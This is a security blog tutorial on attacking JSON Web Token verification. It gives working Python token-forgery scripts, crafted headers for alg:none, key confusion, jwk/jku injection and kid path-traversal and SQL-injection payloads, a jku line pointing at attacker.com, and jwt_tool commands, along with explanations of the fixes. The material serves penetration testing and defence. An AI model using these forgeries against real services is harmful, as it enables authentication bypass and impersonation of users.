---
title: "Everything JWT: From alg:none to Key Confusion"
date: 2023-03-18T10:00:00-05:00
draft: false
difficulty: ""
---

Most developers treat JWTs as magic tokens that just work. They don't understand the verification process, and that's where things go wrong. This post covers the most common JWT attacks I've used and seen in the wild, with working examples for each.

<!--more-->

## How JWTs Work (Quickly)

A JWT has three base64-encoded parts separated by dots: header, payload, signature.

The header tells the server which algorithm to use for verification. The payload contains claims like user ID, role, expiration. The signature is computed over the header and payload using either a shared secret (HMAC) or a private key (RSA/ECDSA).

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsInJvbGUiOiJ1c2VyIn0.HMAC_SIGNATURE
```

The server decodes the header, checks the algorithm, and verifies the signature accordingly. The problem is that many implementations let the token itself dictate how it should be verified.

## Attack 1: alg:none

This is the simplest JWT attack and it still works more often than you'd expect.

The JWT spec includes a "none" algorithm, which means "this token is unsigned." It was intended for situations where the token has already been verified by other means. In practice, if a server accepts `alg: none`, you can forge any token you want.

Take a valid token and decode the header:

```json
{"alg": "HS256", "typ": "JWT"}
```

Change it to:

```json
{"alg": "none", "typ": "JWT"}
```

Base64url encode that, modify the payload however you want (change your role to admin, change your user_id to someone else's), base64url encode the payload, and concatenate them with a dot. Leave the signature empty but keep the trailing dot:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMSIsInJvbGUiOiJhZG1pbiJ9.
```

Send it. If the server accepts it, you now have a forged token with whatever claims you want.

Variations to try when `none` doesn't work:

- `None`
- `NONE`
- `nOnE`

Some implementations do case-sensitive checks against "none" but miss the mixed-case variants.

In Python, you can automate this:

```python
import base64
import json

def b64url_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"user_id": "1", "role": "admin"}

token = f"{b64url_encode(header)}.{b64url_encode(payload)}."
print(token)
```

## Attack 2: HMAC/RSA Key Confusion

This is the one that catches people off guard. It exploits a fundamental design flaw in how many JWT libraries handle algorithm selection.

Here's the setup: the server uses RS256 (RSA) to sign tokens. It has a private key for signing and a public key for verification. The public key is often accessible, sometimes at a JWKS endpoint or just embedded in the app's JavaScript.

The attack: change the algorithm in the header from RS256 to HS256. Then sign the token using the server's RSA **public key** as the HMAC secret.

Why this works: when the server sees `alg: HS256`, it uses its "verification key" to check the HMAC. In an RSA setup, the verification key is the public key. So the server uses the public key as an HMAC secret, which is exactly what you signed with.

Step by step:

1. Get the server's public key. Check `/.well-known/jwks.json`, the app's JS files, or the server's TLS certificate in some edge cases.

2. Convert the public key to the right format. Some libraries expect the raw PEM string including newlines:

```bash
cat public.pem
```

3. Forge the token:

```python
import hmac
import hashlib
import base64
import json

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_encode_json(obj):
    return b64url_encode(json.dumps(obj, separators=(',', ':')))

header = {"alg": "HS256", "typ": "JWT"}
payload = {"user_id": "1", "role": "admin"}

with open('public.pem', 'rb') as f:
    public_key = f.read()

signing_input = f"{b64url_encode_json(header)}.{b64url_encode_json(payload)}"
signature = hmac.new(public_key, signing_input.encode(), hashlib.sha256).digest()

token = f"{signing_input}.{b64url_encode(signature)}"
print(token)
```

This attack works against libraries that trust the `alg` header without checking it against an expected algorithm. The fix is to always enforce the expected algorithm server-side and never let the token dictate it.

Edge cases: some libraries strip newlines from the key before using it. If your forged signature doesn't verify, try stripping `\n` from the public key bytes before signing. Also try with and without the PEM header/footer lines.

## Attack 3: JWK Header Injection

Some JWT libraries support embedding a JWK (JSON Web Key) directly in the token header. The `jwk` parameter tells the server "use this key to verify me." If the server trusts it, you can sign a token with your own key and include the corresponding public key in the header.

Generate a key pair:

```bash
openssl genrsa -out attacker.pem 2048
openssl rsa -in attacker.pem -pubout -out attacker_pub.pem
```

Extract the public key components (n and e) in the format JWK expects. Then build the token:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "<your public key modulus, base64url encoded>",
    "e": "AQAB"
  }
}
```

Sign the token with your private key. The server reads the `jwk` from the header, uses it to verify the signature, and it passes because you signed with the matching private key.

The `jku` parameter is a similar vector. Instead of embedding the key, it provides a URL where the server should fetch the key. Point it to your own server hosting a JWKS file with your public key. If the server fetches from arbitrary URLs without validation, you're in.

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/.well-known/jwks.json"
}
```

## Attack 4: kid Parameter Injection

The `kid` (key ID) parameter in the header tells the server which key to use for verification. How the server resolves the key ID depends on the implementation. If it uses the `kid` value in a file path or database query, you might have injection.

**Path traversal:**

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../dev/null"
}
```

If the server reads the key from a file based on `kid`, pointing it to `/dev/null` gives you an empty key. Sign the token with an empty string as the HMAC secret.

**SQL injection:**

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "1' UNION SELECT 'attacker-controlled-secret' -- "
}
```

If the server looks up the key in a database using `kid`, you can inject a query that returns a value you control, then use that value as the HMAC secret.

## Tools

[jwt_tool](https://github.com/ticarpi/jwt_tool) automates all of these attacks:

```bash
# Test alg:none
python3 jwt_tool.py <token> -X a

# Test key confusion
python3 jwt_tool.py <token> -X k -pk public.pem

# Test JWK injection
python3 jwt_tool.py <token> -X i

# Scan for all known vulnerabilities
python3 jwt_tool.py <token> -M at
```

## What to Look For

When you're testing an application, grab a valid JWT and start with these checks:

1. Does the server accept `alg: none`? Try all case variations.
2. Can you find the public key? Check JWKS endpoints, JS bundles, and TLS certs.
3. Does key confusion work? Switch RS256 to HS256 and sign with the public key.
4. Does the server accept `jwk` or `jku` in the header?
5. Is the `kid` parameter used? Test for path traversal and SQL injection.
6. What happens with expired tokens? Some servers don't check `exp` at all.
7. Can you tamper with claims without re-signing? (Broken verification logic.)

Most JWT vulnerabilities exist because the server trusts data from the token itself to make verification decisions. The algorithm, the key, the key location. The token should never get to decide how it's verified.